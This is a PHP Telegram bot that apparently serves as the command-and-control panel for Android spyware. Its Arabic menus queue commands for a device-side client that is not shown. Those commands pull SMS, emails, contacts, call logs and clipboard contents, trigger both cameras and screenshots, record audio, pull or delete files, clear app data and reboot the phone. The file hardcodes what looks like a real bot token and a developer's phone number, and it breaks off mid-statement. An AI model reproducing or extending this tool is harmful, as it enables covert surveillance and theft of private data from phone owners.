<?php
ob_start();
error_reporting(0);
#==================#
//ايديك
$admin = 7825600665;
//توكنك
$token = "8222075662:AAGPOdT4DzZ9rHNB6CMsISUX6GYgFlrRusY";
#==================#
define('API_KEY', $token);

function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

function sendmessage($chat_id, $text, $reply_markup = null)
{
    $params = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => "Markdown"
    ];
    if ($reply_markup !== null) {
        $params['reply_markup'] = $reply_markup;
    }
    return bot('sendMessage', $params); // ترجع نتيجة الإرسال للحصول على message_id
}

function editmessagemarkup($chat_id, $message_id, $reply_markup = null)
{
    $params = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
    ];
    if ($reply_markup !== null) {
        $params['reply_markup'] = $reply_markup;
    }
    bot('editMessageReplyMarkup', $params);
}

function editmessagetext($chat_id, $message_id, $text, $reply_markup = null)
{
    $params = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => "Markdown"
    ];
    if ($reply_markup !== null) {
        $params['reply_markup'] = $reply_markup;
    }
    bot('editMessageText', $params);
}

function sendphoto($chat_id, $photo, $caption)
{
    bot('sendphoto', [
        'chat_id' => $chat_id,
        'photo' => $photo,
        'caption' => $caption,
    ]);
}

function sendsticker($chat_id, $sticker_id, $caption)
{
    bot('sendsticker', [
        'chat_id' => $ChatId,
        'sticker' => $sticker_id,
        'caption' => $caption
    ]);
}

function answerCallbackQuery($callback_query_id, $text = null, $show_alert = false, $url = null, $cache_time = 0)
{
    $params = [
        'callback_query_id' => $callback_query_id,
        'text' => $text,
        'show_alert' => $show_alert,
        'url' => $url,
        'cache_time' => $cache_time,
    ];
    bot('answerCallbackQuery', $params);
}

// دالة جديدة لتحويل رابط Google Drive إلى رابط مباشر
function getDirectGoogleDriveLink($share_link) {
    // التأكد من أن الرابط هو رابط Google Drive صالح
    if (preg_match('/drive\.google\.com\/(?:file\/d\/|open\?id=)([a-zA-Z0-9_-]+)/', $share_link, $matches)) {
        $file_id = $matches[1];
        return "https://drive.google.com/uc?export=download&id=" . $file_id;
    }
    // إذا لم يكن رابط Google Drive أو لم يتم العثور على FILE_ID، نرجع الرابط الأصلي
    return $share_link;
}

//-//////
$update = json_decode(file_get_contents('php://input'));
// التحقق من نوع الرسالة (عادية أو ضغط زر)
if (isset($update->message)) {
    $message = $update->message;
    $chat_id = $message->chat->id;
    $message_id = $message->message_id;
    $text = $message->text;
} elseif (isset($update->callback_query)) {
    $callback_query = $update->callback_query;
    $chat_id = $callback_query->message->chat->id;
    $message_id = $callback_query->message->message_id; // معرف الرسالة التي تحتوي على الأزرار
    $data = $callback_query->data;
    $callback_query_id = $callback_query->id; // نحصل على معرف الاستعلام
} else {
    // لا تخرج هنا، قد نحتاج إلى معالجة أشياء أخرى
    //exit; // إنهاء إذا لم تكن رسالة ولا زر
}
// التحقق مما إذا كانت الرسالة من مجموعة والخروج
if (isset($update->message->chat->type)) {
    $chat_type = $update->message->chat->type;
    if ($chat_type === "group" || $chat_type === "supergroup") {
        exit;
    }
}
// أكمل تنفيذ الأوامر هنا حسب الحاجة
// باقي الكود هنا إذا لم تكن الرسالة من مجموعة
$user_id = $message->from->id;
$name = $message->from->first_name;
$username = $message->from->username;
// قراءة معرفات المستخدمين المخزنة في الملف وتحويلها إلى مصفوفة
$u = explode("\n", file_get_contents("database/ID.txt"));
// حساب عدد الأعضاء الحاليين
$c = count($u) - 1;
// التأكد من أن $update و $chat_id تم تعريفهما وأن $chat_id غير موجودة بالفعل في المصفوفة $u
$ban = file_get_contents("database/ban.txt");
$exb = explode("\n", $ban);
// إرسال رسالة إلى الإدمن عن المستخدم الجديد
#===============
mkdir("database");
mkdir("database/$chat_id");
#==========لوحه تحكم========#
#===============
mkdir("data");
mkdir("data/$chat_id");
#==========لوحه تحكم========#
$id = $message->from->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$sajad = file_get_contents("database/rembo.txt");
// تم تصحيح مسار قراءة الـ step ليتوافق مع الـ chat_id الحالي
$step = file_exists("database/$chat_id/step.txt") ? file_get_contents("database/$chat_id/step.txt") : ""; 
$ch = file_get_contents("database/ch.txt");
$tn = file_get_contents("database/tnb.txt");
$bot = file_get_contents("database/bot.txt");
$m = explode("\n", file_get_contents("database/ID.txt"));
$m1 = count($m) - 1;
if ($message and !in_array($id, $m)) {
    file_put_contents("database/ID.txt", $id . "\n", FILE_APPEND);
}

// تعريف لوحات المفاتيح (اللوحات)
$main_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "⚙️ التحكم الاساسي", 'callback_data' => "page_basic_control"]],
        [['text' => "🗂️ إدارة الملفات", 'callback_data' => "page_file_management"]],
        [['text' => "📊 سحب البيانات", 'callback_data' => "page_data_pulling"]],
        [['text' => "📺 الوسائط والمستشعرات", 'callback_data' => "page_media_sensors"]],
        [['text' => "🗃️ إدارة التطبيقات", 'callback_data' => "page_app_management"]],
        [['text' => "⚡ أوامر متقدمة", 'callback_data' => "page_advanced_commands"]],
        [['text' => "ℹ️ حول البوت", 'callback_data' => "about_bot"]]
    ]
]);

// لوحة "التحكم الأساسي" - تم التحديث
$basic_control_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "🟢 تشغيل الفلاش", 'callback_data' => "flash_web"], ['text' => "🔴 ايقاف الفلاش", 'callback_data' => "off_web"]],
        [['text' => "📳 تشغيل الاهتزاز", 'callback_data' => "hz_web"], ['text' => "🔊 مستوى الصوت", 'callback_data' => "request_sond"]],
        [['text' => "🖼️ تغيير الخلفية", 'callback_data' => "bg_web"]],
        [['text' => "💡 ضبط سطوع الشاشة", 'callback_data' => "request_brightness"]], 
        [['text' => "🔊 وضع عام", 'callback_data' => "Am"], ['text' => "🔇 وضع صامت", 'callback_data' => "set_silent_mode"]], 
        [['text' => "📳 وضع اهتزاز", 'callback_data' => "set_vibrate_mode"]], 
        [['text' => "🔄 تحديث", 'callback_data' => "Non"]], // ✨ تم إضافة زر التحديث
        [['text' => "➡️ العودة للقائمة الرئيسية", 'callback_data' => "back_to_main"]]
    ]
]);

// لوحة "إدارة الملفات" - تم التحديث
$file_management_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "📂 عرض الملفات", 'callback_data' => "request_dir"]],
        [['text' => "📥 سحب ملف", 'callback_data' => "request_file"]],
        [['text' => "🗑️ حذف ملف/مجلد", 'callback_data' => "request_del"]],
        [['text' => "✏️ إعادة تسمية ملف/مجلد", 'callback_data' => "request_rename"]], 
        [['text' => "↔️ نقل ملف/مجلد", 'callback_data' => "request_move"]], 
        [['text' => "📝 نسخ ملف/مجلد", 'callback_data' => "request_copy"]], 
        [['text' => "🔄 تحديث", 'callback_data' => "Non"]], // ✨ تم إضافة زر التحديث
        [['text' => "➡️ العودة للقائمة الرئيسية", 'callback_data' => "back_to_main"]]
    ]
]);

// لوحة "سحب البيانات"
$data_pulling_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "📋 سحب بيانات مباشر", 'callback_data' => "inf_web"]],
        [['text' => "سحب الرسائل 💬", 'callback_data' => "pull_messages"]],
        [['text' => "سحب الايميلات 📧", 'callback_data' => "pull_emails"]],
        [['text' => "جهات الاتصال 🧑‍🤝‍🧑", 'callback_data' => "pull_contacts"]],
        [['text' => "المكالمات الصادرة 📞", 'callback_data' => "pull_outgoing_calls"]],
        [['text' => "📋 سحب الحافظة", 'callback_data' => "pull_clipboard"]],
        [['text' => "🔄 تحديث", 'callback_data' => "Non"]], // ✨ تم إضافة زر التحديث
        [['text' => "➡️ العودة للقائمة الرئيسية", 'callback_data' => "back_to_main"]]
    ]
]);

// لوحة "الوسائط والمستشعرات"
$media_sensors_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "كاميرا رئيسية 📸", 'callback_data' => "front_web"], ['text' => "كاميرا سلفي 📸", 'callback_data' => "selfi_web"]],
        [['text' => "سكرين شوت 📱", 'callback_data' => "scr_web"]],
        [['text' => "بدء سحب الصور 🖼️", 'callback_data' => "sor6"]],
        [['text' => "📶 استكمال السحب", 'callback_data' => "con6"], ['text' => "📴 ايقاف السحب", 'callback_data' => "stop6"]],
        [['text' => "تسجيل صوت 5 ثواني 🎤", 'callback_data' => "record"]],
        [['text' => "🎶 تشغيل صوت من Drive", 'callback_data' => "request_google_audio"]],
        [['text' => "🔄 تحديث", 'callback_data' => "Non"]], // ✨ تم إضافة زر التحديث
        [['text' => "➡️ العودة للقائمة الرئيسية", 'callback_data' => "back_to_main"]]
    ]
]);

// لوحة "إدارة التطبيقات" - تم التحديث
$app_management_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "📱 عرض التطبيقات", 'callback_data' => "list_apps"]],
        [['text' => "🚀 فتح تطبيق", 'callback_data' => "open_app"]],
        [['text' => "🧹 مسح بيانات تطبيق معين", 'callback_data' => "del_data_app"]], 
        [['text' => "🔄 تحديث", 'callback_data' => "Non"]], // ✨ تم إضافة زر التحديث
        [['text' => "➡️ العودة للقائمة الرئيسية", 'callback_data' => "back_to_main"]]
    ]
]);

// لوحة "أوامر متقدمة"
$advanced_commands_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "📢 عمل توست", 'callback_data' => "request_toast"], ['text' => "🗣️ Spetch", 'callback_data' => "request_spetch"]],
        [['text' => "🔔 عمل إشعار", 'callback_data' => "request_ashar"]],
        [['text' => "🔗 URL", 'callback_data' => "request_url"]],
        [['text' => "📡 تشغيل البلوتوث", 'callback_data' => "bluetooth_on"], ['text' => "🚫 إيقاف البلوتوث", 'callback_data' => "bluetooth_off"]],
        [['text' => "🔄 إعادة تشغيل الجهاز", 'callback_data' => "reboot_device"]],
        [['text' => "🔄 تحديث", 'callback_data' => "Non"]], // ✨ تم إضافة زر التحديث
        [['text' => "➡️ العودة للقائمة الرئيسية", 'callback_data' => "back_to_main"]]
    ]
]);

// لوحة "حول البوت"
$about_bot_keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => "📞 تواصل عبر تلجرام", 'url' => "https://t.me/Yaman_Al_hriri"]],
        [['text' => "📱 تواصل عبر واتساب", 'url' => "https://wa.me/963969893292"]],
        [['text' => "🔄 تحديث", 'callback_data' => "Non"]], // ✨ تم إضافة زر التحديث
        [['text' => "➡️ العودة للقائمة الرئيسية", 'callback_data' => "back_to_main"]]
    ]
]);

// معلومات المبرمج (النص يمكن أن يكون ثابتاً أو يتغير حسب الحاجة)
$about_bot_text = "*👋 أهلاً بك في بوت التحكم بالهاتف!\n\nهذا البوت تم تطويره بواسطة يمان الحريري (Yaman Alhariri).\n\nيمتلك يمان خبرة واسعة في تطوير البوتات وأنظمة التحكم عن بعد، ويهدف هذا البوت إلى توفير أدوات قوية وسهلة الاستخدام للتحكم بأجهزتك الذكية بفعالية وأمان. نأمل أن تستمتع بتجربة استخدام سلسة ومفيدة.\n\nيمكنك التواصل مع المطور للمساعدة أو الاقتراحات عبر الأزرار أدناه.\n\nشكراً لاستخدامك البوت!*";

if ($text == '/start' and $id == $admin) {
    if (!in_array($id, $u)) {
        sendmessage($chat_id, "*👋 أهلاً بك في بوت التحكم بالهاتف\!*");
    }
    // حفظ معرف الرسالة الرئيسية للتحكم بها لاحقاً
    $sent_message = sendmessage(
        $chat_id,
        "*اختر الفئة التي تريدها من الأوامر:*",
        $main_keyboard
    );
    file_put_contents("database/$chat_id/main_message_id.txt", $sent_message->result->message_id);
    file_put_contents("database/$chat_id/current_keyboard_page.txt", "main"); // حفظ الصفحة الحالية
    // عند البدء أو العودة للقائمة الرئيسية، تأكد من مسح أي step سابق
    file_put_contents("database/$chat_id/step.txt", ""); 
}

// جلب معرف الرسالة الرئيسية وصفحة لوحة المفاتيح الحالية
$main_message_id = file_exists("database/$chat_id/main_message_id.txt") ? file_get_contents("database/$chat_id/main_message_id.txt") : null;
$current_page = file_exists("database/$chat_id/current_keyboard_page.txt") ? file_get_contents("database/$chat_id/current_keyboard_page.txt") : "main";


if (isset($callback_query_id)) {
    // عند الضغط على أي زر، قم بمسح الـ step الحالي لضمان عدم وجود حالة معلقة
    file_put_contents("database/$chat_id/step.txt", ""); 

    // معالجة التنقل بين الصفحات
    if ($data == 'page_basic_control') {
        editmessagetext($chat_id, $message_id, "*تحكم الجهاز الأساسي:*", $basic_control_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "basic_control");
    } elseif ($data == 'page_file_management') {
        editmessagetext($chat_id, $message_id, "*إدارة الملفات:*", $file_management_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "file_management");
    } elseif ($data == 'page_data_pulling') {
        editmessagetext($chat_id, $message_id, "*سحب بيانات الجهاز:*", $data_pulling_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "data_pulling");
    } elseif ($data == 'page_media_sensors') {
        editmessagetext($chat_id, $message_id, "*الوسائط والمستشعرات:*", $media_sensors_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "media_sensors");
    } elseif ($data == 'page_app_management') {
        editmessagetext($chat_id, $message_id, "*إدارة التطبيقات:*", $app_management_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "app_management");
    } elseif ($data == 'page_advanced_commands') {
        editmessagetext($chat_id, $message_id, "*أوامر متقدمة:*", $advanced_commands_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "advanced_commands");
    } elseif ($data == 'about_bot') {
        editmessagetext($chat_id, $message_id, $about_bot_text, $about_bot_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "about_bot");
    } elseif ($data == 'back_to_main') {
        editmessagetext($chat_id, $message_id, "*اختر الفئة التي تريدها من الأوامر:*", $main_keyboard);
        file_put_contents("database/$chat_id/current_keyboard_page.txt", "main");
        // عند العودة للقائمة الرئيسية، تأكد من مسح أي step سابق
        file_put_contents("database/$chat_id/step.txt", ""); 
    }

    // معالجة الأوامر التي لا تتطلب مدخلات
    elseif ($data == 'Non') { // ✨ معالجة الزر الجديد "تحديث" (المتكرر في كل قائمة فرعية)
        answerCallbackQuery($callback_query_id, "تم إرسال طلب التحديث . . .");
        file_put_contents("order.txt", "Non");
        echo "Non";
    } elseif ($data == 'flash_web') {
        answerCallbackQuery($callback_query_id, "تم إرسال الطلب . . .");
        file_put_contents("order.txt", "flash");
        echo "flash";
    } elseif ($data == 'off_web') {
        answerCallbackQuery($callback_query_id, "تم إرسال الطلب . . .");
        file_put_contents("order.txt", "off");
        echo "off";
    } elseif ($data == 'bg_web') {
        answerCallbackQuery($callback_query_id, "أرسل الآن رابط الصورة التي تريد تعيينها كخلفية.");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_bg_url");
    } elseif ($data == 'hz_web') {
        answerCallbackQuery($callback_query_id, "تم إرسال الطلب . . .");
        file_put_contents("order.txt", "hz");
        echo "hz";
    } elseif ($data == 'inf_web') {
        answerCallbackQuery($callback_query_id, "تم إرسال الطلب . . .");
        file_put_contents("order.txt", "inf");
        echo "inf";
    } elseif ($data == 'front_web') {
        answerCallbackQuery($callback_query_id, "تم إرسال الطلب . . .");
        file_put_contents("order.txt", "front");
        echo "front";
    } elseif ($data == 'selfi_web') {
        answerCallbackQuery($callback_query_id, "تم إرسال الطلب . . .");
        file_put_contents("order.txt", "selfi");
        echo "selfi";
    } elseif ($data == 'scr_web') {
        answerCallbackQuery($callback_query_id, "تم إرسال الطلب . . .");
        file_put_contents("order.txt", "scr");
        echo "scr";
    } elseif ($data == 'con6') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب استكمال سحب الصور . . .");
        file_put_contents("order.txt", "con6");
        echo "con6";
    } elseif ($data == 'stop6') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب إيقاف سحب الصور . . .");
        file_put_contents("order.txt", "stop6");
        echo "stop6";
    } elseif ($data == 'bluetooth_on') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب تشغيل البلوتوث . . .");
        file_put_contents("order.txt", "bluetooth_on");
        echo "bluetooth_on";
    } elseif ($data == 'bluetooth_off') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب إيقاف البلوتوث . . .");
        file_put_contents("order.txt", "bluetooth_off");
        echo "bluetooth_off";
    } elseif ($data == 'sor6') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب سحب الصور . . .");
        file_put_contents("order.txt", "sor6");
        echo "sor6";
    } elseif ($data == 'pull_messages') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب سحب الرسائل . . .");
        file_put_contents("order.txt", "pull_messages");
        echo "pull_messages";
    } elseif ($data == 'pull_emails') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب سحب الايميلات . . .");
        file_put_contents("order.txt", "pull_emails");
        echo "pull_emails";
    } elseif ($data == 'record') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب تسجيل صوت 5 ثواني . . .");
        file_put_contents("order.txt", "record");
        echo "record";
    } elseif ($data == 'pull_contacts') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب سحب جهات الاتصال . . .");
        file_put_contents("order.txt", "pull_contacts");
        echo "pull_contacts";
    } elseif ($data == 'pull_outgoing_calls') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب سحب المكالمات الصادرة . . .");
        file_put_contents("order.txt", "pull_outgoing_calls");
        echo "pull_outgoing_calls";
    } elseif ($data == 'pull_clipboard') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب سحب النص من الحافظة . . .");
        file_put_contents("order.txt", "pull_clipboard");
        echo "pull_clipboard";
    } elseif ($data == 'list_apps') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب عرض التطبيقات المثبتة . . .");
        file_put_contents("order.txt", "list_apps");
        echo "list_apps";
    } elseif ($data == 'reboot_device') {
        answerCallbackQuery($callback_query_id, "تم إرسال طلب إعادة تشغيل الجهاز . . .");
        file_put_contents("order.txt", "reboot_device");
        echo "reboot_device";
    }
    // أوضاع الصوت الجديدة
    elseif ($data == 'Am') { // جديد
        answerCallbackQuery($callback_query_id, "تم إرسال طلب تفعيل الوضع العام . . .");
        file_put_contents("order.txt", "Am");
        echo "Am";
    } elseif ($data == 'set_silent_mode') { // جديد
        answerCallbackQuery($callback_query_id, "تم إرسال طلب تفعيل الوضع الصامت . . .");
        file_put_contents("order.txt", "Sam");
        echo "Sam";
    } elseif ($data == 'set_vibrate_mode') { // جديد
        answerCallbackQuery($callback_query_id, "تم إرسال طلب تفعيل وضع الاهتزاز . . .");
        file_put_contents("order.txt", "Hz");
        echo "Hz";
    }

    // معالجة الأوامر التي تتطلب مدخلات
    elseif ($data == 'request_toast') {
        answerCallbackQuery($callback_query_id, "أرسل الآن نص التوست الذي تريده.");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_toast");
    } elseif ($data == 'request_spetch') {
        answerCallbackQuery($callback_query_id, "أرسل الآن نص Spetch الذي تريده.");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_spetch");
    } elseif ($data == 'request_url') {
        answerCallbackQuery($callback_query_id, "أرسل الآن الرابط (URL) الذي تريده.");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_url");
    } elseif ($data == 'request_ashar') {
        answerCallbackQuery($callback_query_id, "أرسل الآن نص الإشعار الذي تريده.");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_ashar");
    } elseif ($data == 'request_google_audio') {
        answerCallbackQuery($callback_query_id, "أرسل الآن رابط ملف الصوت من Google Drive.");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_google_audio");
    } elseif ($data == 'request_dir') {
        answerCallbackQuery($callback_query_id, "أرسل الآن المسار الذي تريد عرض ملفاته (مثال: /sdcard/).");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_dir_path");
    } elseif ($data == 'request_file') {
        answerCallbackQuery($callback_query_id, "أرسل الآن المسار الكامل للملف الذي تريد سحبه (مثال: /sdcard/Download/my_doc.pdf).");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_file_path");
    } elseif ($data == 'request_del') {
        answerCallbackQuery($callback_query_id, "أرسل الآن المسار الكامل للملف أو المجلد الذي تريد حذفه (مثال: /sdcard/Download/file.txt أو /sdcard/Download/folder/).");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_del_path");
    } elseif ($data == 'open_app') {
        answerCallbackQuery($callback_query_id, "أرسل الآن اسم حزمة التطبيق الذي تريد فتحه (مثال: com.whatsapp).");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_app_package");
    } elseif ($data == 'request_sond') {
        answerCallbackQuery($callback_query_id, "أرسل الآن نسبة مستوى الصوت (عدد من 0 إلى 100).");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_sond_level");
    }
    // الأوامر الجديدة التي تتطلب مدخلات
    elseif ($data == 'request_brightness') { // جديد
        answerCallbackQuery($callback_query_id, "أرسل الآن نسبة سطوع الشاشة (عدد من 0 إلى 100).");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_brightness_level");
    } elseif ($data == 'del_data_app') { // جديد
        answerCallbackQuery($callback_query_id, "أرسل الآن اسم حزمة التطبيق الذي تريد مسح بياناته (مثال: com.whatsapp).");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_app_data_clear");
    } elseif ($data == 'request_rename') { // جديد
        answerCallbackQuery($callback_query_id, "أرسل المسار القديم للملف/المجلد والاسم الجديد مفصولين بعلامة | \nمثال: /sdcard/old_file.txt|new_file.txt");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_rename_paths");
    } elseif ($data == 'request_move') { // جديد
        answerCallbackQuery($callback_query_id, "أرسل مسار المصدر ومسار الوجهة مفصولين بعلامة | \nمثال: /sdcard/file.txt|/sdcard/new_folder/file.txt");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_move_paths");
    } elseif ($data == 'request_copy') { // جديد
        answerCallbackQuery($callback_query_id, "أرسل مسار المصدر ومسار الوجهة مفصولين بعلامة | \nمثال: /sdcard/file.txt|/sdcard/backup_folder/file.txt");
        file_put_contents("database/$chat_id/step.txt", "waiting_for_copy_paths");
    }
}


// استقبال ومعالجة المدخلات من المستخدم بناءً على الـ step
if (isset($message)) { // تأكد أن الرسالة ليست callback_query
    $current_step = file_exists("database/$chat_id/step.txt") ? file_get_contents("database/$chat_id/step.txt") : "";

    if ($current_step == "waiting_for_toast") {
        $ya = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "toast: " . $ya);
        sendmessage($chat_id, "تم حفظ نص التوست: `$ya` وسيتم إرساله.");
        echo "toast: " . $ya;
    } elseif ($current_step == "waiting_for_spetch") {
        $spetch_text = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "spetch: " . $spetch_text);
        sendmessage($chat_id, "تم حفظ نص spetch:  `$spetch_text` وسيتم إرساله.");
        echo "spetch: " . $spetch_text;
    } elseif ($current_step == "waiting_for_url") {
        $url_text = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "url: " . $url_text);
        sendmessage($chat_id, "تم حفظ الرابط: `$url_text` وسيتم إرساله.");
        echo "url: " . $url_text;
    } elseif ($current_step == "waiting_for_ashar") {
        $ashar_text = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "ashar: " . $ashar_text);
        sendmessage($chat_id, "تم حفظ نص الإشعار: `$ashar_text` وسيتم إرساله.");
        echo "ashar: " . $ashar_text;
    } elseif ($current_step == "waiting_for_bg_url") {
        $bg_url = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "bg: " . $bg_url);
        sendmessage($chat_id, "تم حفظ رابط الخلفية: `$bg_url` وسيتم إرساله.");
        echo "bg: " . $bg_url;
    } elseif ($current_step == "waiting_for_google_audio") {
        // ****** هذا هو القسم الذي سيتم تعديله ******
        $google_audio_link_raw = $text; // الرابط الأصلي الذي أرسله المستخدم
        $direct_google_audio_link = getDirectGoogleDriveLink($google_audio_link_raw); // تحويل الرابط

        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "google: " . $direct_google_audio_link); // حفظ الرابط المباشر
        
        // إرسال رسالة تأكيد للرابط المباشر الذي تم حفظه
        sendmessage($chat_id, "تم تحويل وحفظ رابط صوت Drive المباشر: `$direct_google_audio_link` وسيتم إرساله.");
        echo "google: " . $direct_google_audio_link;
    } elseif ($current_step == "waiting_for_dir_path") {
        $dir_path = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "dir: " . $dir_path);
        sendmessage($chat_id, "تم حفظ المسار: `$dir_path` وسيتم إرساله لعرض الملفات.");
        echo "dir: " . $dir_path;
    } elseif ($current_step == "waiting_for_file_path") {
        $file_path = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "file: " . $file_path);
        sendmessage($chat_id, "تم حفظ مسار الملف: `$file_path` وسيتم إرساله لسحب الملف.");
        echo "file: " . $file_path;
    } elseif ($current_step == "waiting_for_del_path") {
        $del_path = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "del: " . $del_path);
        sendmessage($chat_id, "تم حفظ مسار الحذف: `$del_path` وسيتم إرساله.");
        echo "del: " . $del_path;
    } elseif ($current_step == "waiting_for_app_package") {
        $app_package = $text;
        file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
        file_put_contents("order.txt", "open_app: " . $app_package);
        sendmessage($chat_id, "تم حفظ اسم حزمة التطبيق: `$app_package` وسيتم إرساله لفتحه.");
        echo "open_app: " . $app_package;
    } elseif ($current_step == "waiting_for_sond_level") {
        $sond_level = (int)$text;
        if ($sond_level >= 0 && $sond_level <= 100) {
            file_put_contents("database/$chat_id/step.txt", ""); // مسح الـ step بعد المعالجة
            file_put_contents("order.txt", "sond: " . $sond_level);
            sendmessage($chat_id, "تم حفظ مستوى الصوت: `$sond_level%` وسيتم إرساله.");
            echo "sond: " . $sond_level;
        } else {
            sendmessage($chat_id, "الرجاء إدخال نسبة مئوية صحيحة بين 0 و 100.");
        }
    }
    // معالجة المدخلات للأوامر الجديدة
    elseif ($current_step == "waiting_for_brightness_level") { // جديد
        $brightness_level = (int)$text;
        if ($brightness_level >= 0 && $brightness_level <= 100) {
            file_put_contents("database/$chat_id/step.txt", "");
            file_put_contents("order.txt", "brightness: " . $brightness_level);
            sendmessage($chat_id, "تم ضبط سطوع الشاشة على: `$brightness_level%`.");
            echo "brightness: " . $brightness_level;
        } else {
            sendmessage($chat_id, "الرجاء إدخال نسبة سطوع صحيحة بين 0 و 100.");
        }
    } elseif ($current_step == "waiting_for_app_data_clear") { // جديد
        $app_package_clear = $text;
        file_put_contents("database/$chat_id/step.txt", "");
        file_put_contents("order.txt", "clear_app_data: " . $app_package_clear);
        sendmessage($chat_id, "تم طلب مسح بيانات التطبيق: `$app_package_clear`.");
        echo "clear_app_data: " . $app_package_clear;
    } elseif ($current_step == "waiting_for_rename_paths") { // جديد
        $parts = explode('|', $text, 2);
        if (count($parts) == 2) {
            $old_path = trim($parts[0]);
            $new_name = trim($parts[1]);
            file_put_contents("database/$chat_id/step.txt", "");
            file_put_contents("order.txt", "rename: " . $old_path . "|" . $new_name);
            sendmessage($chat_id, "تم طلب إعادة تسمية: `$old_path` إلى `$new_name`.");
            echo "rename: " . $old_path . "|" . $new_name;
        } else {
            sendmessage($chat_id, "صيغة غير صحيحة. الرجاء إرسال المسار القديم والاسم الجديد مفصولين بعلامة |.");
        }
    } elseif ($current_step == "waiting_for_move_paths") { // جديد
        $parts = explode('|', $text, 2);
        if (count($parts) == 2) {
            $source_path = trim($parts[0]);
            $destination_path = trim($parts[1]);
            file_put_contents("database/$chat_id/step.txt", "");
            file_put_contents("order.txt", "move: " . $source_path . "|" . $destination_path);
            sendmessage($chat_id, "تم طلب نقل: `$source_path` إلى `$destination_path`.");
            echo "move: " . $source_path . "|" . $destination_path;
        } else {
            sendmessage($chat_id, "صيغة غير صحيحة. الرجاء إرسال مسار المصدر ومسار الوجهة مفصولين بعلامة |.");
        }
    } elseif ($current_step == "waiting_for_copy_paths") { // جديد
        $parts = explode('|', $text, 2);
        if (count($parts) == 2) {
            $source_path = trim($parts[0]);
            $destination_path = trim($parts[1]);
            file_put_contents("database/$chat_id/step.txt", "");
            file_put_contents("order.txt", "copy: " . $source_path . "|" . $destination_path);
            sendmessage($chat_id, "تم طلب نسخ: `$source_path` إلى `$destination_path`.");
            echo "copy: " . $source_path . "|" . $destination_path;
        } else {
            sendmessage($chat_id, "صيغة غير صحيحة. الرجاء إرسال مسار المصدر ومسار الوجهة مفصولين بعلامة |.");
        }
    }
}


// قراءة وعرض محتوى order.txt (هذا الجزء هو لجهة الخادم التي تتلقى الأوامر)
$order_content = file_get_contents("order.txt");
if (strpos($order_content, "flash") === 0) {
    echo "flash";
} elseif (strpos($order_content, "toast: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "spetch: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "url: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "off") === 0) {
    echo "off";
